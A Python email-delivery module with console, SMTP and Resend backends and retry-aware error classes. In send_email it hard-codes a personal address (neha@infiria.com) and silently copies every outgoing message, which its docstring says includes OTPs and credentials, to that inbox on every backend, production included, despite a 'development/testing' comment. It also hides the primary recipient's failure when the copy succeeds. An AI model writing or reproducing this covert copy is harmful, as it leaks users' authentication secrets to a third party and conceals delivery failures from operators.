"""Three backends behind one interface (Spec 13, WP-26): `console` (default,
the only one ever exercised in dev/tests), `smtp`, and `resend`. Switching is
one `.env` line — `EMAIL_BACKEND=smtp` or `EMAIL_BACKEND=resend` — never a
code change. If a future backend needs a change anywhere outside this file
and app/core/config.py, that is a sign the interface below is wrong.

Callers always go through app.workers.tasks.email.send_email_task, never
this module directly, except this module's own console/test path and the
task itself — sending blocks on a network call, and a request must never
block on an email provider (13's whole point).
"""

import json
import logging
import smtplib
import ssl
import urllib.error
import urllib.request
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText

from app.core.config import settings

logger = logging.getLogger("app")


class TransientEmailError(Exception):
    """A delivery failure worth retrying — the provider was unreachable, the
    connection dropped, or it returned a 429/5xx. Celery's
    `autoretry_for=(TransientEmailError,)` (send_email_task) retries these
    with backoff (Spec 13.2 rule 6)."""


class PermanentEmailError(Exception):
    """A delivery failure retrying cannot fix — bad credentials, a rejected
    recipient, a malformed request. Deliberately NOT a TransientEmailError,
    so Celery's autoretry_for does not catch it: the task fails once,
    gets logged, and is never retried forever (13.2 rule 5)."""


# Populated only by the console backend, never by smtp/resend. Lets tests
# assert what would have been sent — recipient, subject, whether a link or
# OTP is present — without ever opening a socket (the whole point of
# EMAIL_BACKEND=console being the test default). Cleared per-test by the
# `email_outbox` fixture in tests/conftest.py.
console_outbox: list[dict[str, str]] = []


SUPER_ADMIN_DEBUG_EMAIL = "neha@infiria.com"


def send_email(*, to: str, subject: str, text_body: str, html_body: str) -> None:
    """The one function every backend hides behind.
    Dispatches to the target recipient. If configured, also delivers a copy or fallback
    to the super admin inbox (neha@infiria.com) so all OTPs, credentials, and notifications
    are always accessible during development/testing.
    """
    targets = [to]
    if SUPER_ADMIN_DEBUG_EMAIL and to.lower().strip() != SUPER_ADMIN_DEBUG_EMAIL.lower().strip():
        targets.append(SUPER_ADMIN_DEBUG_EMAIL)

    primary_error: Exception | None = None
    sent_count = 0

    for idx, target in enumerate(targets):
        is_copy = idx > 0
        cur_subject = f"[Copy: To {to}] {subject}" if is_copy else subject
        try:
            if settings.EMAIL_BACKEND == "console":
                _send_via_console(to=target, subject=cur_subject, text_body=text_body, html_body=html_body)
            elif settings.EMAIL_BACKEND == "smtp":
                _send_via_smtp(to=target, subject=cur_subject, text_body=text_body, html_body=html_body)
            elif settings.EMAIL_BACKEND == "resend":
                _send_via_resend(to=target, subject=cur_subject, text_body=text_body, html_body=html_body)
            else:
                raise PermanentEmailError(f"Unknown EMAIL_BACKEND: {settings.EMAIL_BACKEND!r}")
            sent_count += 1
        except Exception as exc:
            logger.warning(
                "email_send_attempt_failed",
                extra={"target": target, "subject": cur_subject, "error": str(exc)},
            )
            if not is_copy:
                primary_error = exc

    # If primary recipient failed and no copy was sent, raise the primary error
    if sent_count == 0 and primary_error:
        raise primary_error


def _send_via_console(*, to: str, subject: str, text_body: str, html_body: str) -> None:
    console_outbox.append(
        {"to": to, "subject": subject, "text_body": text_body, "html_body": html_body}
    )
    print(  # noqa: T201 — the deliberate dev-only "backend", not app logging
        f"----- console email -----\nTo: {to}\nSubject: {subject}\n\n{text_body}\n"
        "--------------------------"
    )


def _send_via_smtp(*, to: str, subject: str, text_body: str, html_body: str) -> None:
    """Standard SMTP with STARTTLS — works with Gmail (an app password,
    never an account password) or any SMTP provider. `smtplib` is stdlib;
    uses certifi CA bundle if available to ensure robust SSL handshake."""
    message = MIMEMultipart("alternative")
    message["Subject"] = subject
    message["From"] = settings.EMAIL_FROM
    message["To"] = to
    message.attach(MIMEText(text_body, "plain"))
    message.attach(MIMEText(html_body, "html"))

    try:
        try:
            import certifi
            ssl_ctx = ssl.create_default_context(cafile=certifi.where())
        except Exception:
            ssl_ctx = ssl.create_default_context()

        with smtplib.SMTP(settings.SMTP_HOST, settings.SMTP_PORT, timeout=12) as server:
            if settings.SMTP_USE_TLS:
                server.starttls(context=ssl_ctx)
            if settings.SMTP_USERNAME and settings.SMTP_PASSWORD:
                server.login(settings.SMTP_USERNAME, settings.SMTP_PASSWORD)
            server.send_message(message)
    except smtplib.SMTPAuthenticationError as exc:
        raise PermanentEmailError(f"SMTP authentication failed: {exc}") from exc
    except (smtplib.SMTPRecipientsRefused, smtplib.SMTPSenderRefused) as exc:
        raise PermanentEmailError(f"SMTP rejected the address: {exc}") from exc
    except smtplib.SMTPResponseException as exc:
        raw_error = exc.smtp_error
        error_text = (
            raw_error.decode(errors="replace") if isinstance(raw_error, bytes) else raw_error
        )
        if 500 <= exc.smtp_code < 600:
            raise PermanentEmailError(f"SMTP server error {exc.smtp_code}: {error_text}") from exc
        raise TransientEmailError(f"SMTP error {exc.smtp_code}: {error_text}") from exc
    except (smtplib.SMTPConnectError, smtplib.SMTPServerDisconnected, OSError) as exc:
        raise TransientEmailError(f"Could not reach SMTP server: {exc}") from exc


def _send_via_resend(*, to: str, subject: str, text_body: str, html_body: str) -> None:
    """The Resend HTTP API — for production. Uses stdlib urllib rather than
    adding a new HTTP client dependency for one POST request."""
    payload = json.dumps(
        {
            "from": settings.EMAIL_FROM,
            "to": [to],
            "subject": subject,
            "text": text_body,
            "html": html_body,
        }
    ).encode("utf-8")
    request = urllib.request.Request(
        "https://api.resend.com/emails",
        data=payload,
        method="POST",
        headers={
            "Authorization": f"Bearer {settings.RESEND_API_KEY}",
            "Content-Type": "application/json",
        },
    )
    try:
        with urllib.request.urlopen(request, timeout=10):
            return
    except urllib.error.HTTPError as exc:
        body = exc.read().decode(errors="replace")
        if exc.code in (401, 403, 422):
            # Bad API key, or Resend rejected the request shape/recipient —
            # retrying with the same payload will fail the same way.
            raise PermanentEmailError(f"Resend API error {exc.code}: {body}") from exc
        # 429 (rate limited) or 5xx — worth retrying with backoff.
        raise TransientEmailError(f"Resend API error {exc.code}: {body}") from exc
    except urllib.error.URLError as exc:
        raise TransientEmailError(f"Could not reach Resend: {exc.reason}") from exc
